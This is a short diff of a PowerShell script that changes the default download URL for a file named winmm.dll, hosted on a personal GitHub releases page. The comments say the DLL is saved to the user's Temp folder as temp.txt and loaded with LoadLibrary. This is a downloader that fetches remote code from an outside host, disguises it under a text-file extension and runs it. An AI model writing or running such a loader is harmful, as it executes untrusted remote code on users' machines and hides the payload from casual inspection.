@@ -4,7 +4,7 @@
 # The DLL file must be a valid DLL; saving it as .txt doesn't change its binary nature, but LoadLibrary will attempt to load it as a DLL.
 
 param(
-    [string]$DllUrl = "https://github.com/boradxshlok/DLL/releases/download/randomscrandssr/winmm.dll"  # Replace with the actual URL of the DLL to download
+    [string]$DllUrl = "https://github.com/boradxshlok/233/releases/download/RANDI/winmm.dll"  # Replace with the actual URL of the DLL to download
 )
 
 # Download the DLL and save it to %LOCALAPPDATA%\Temp\temp.txt
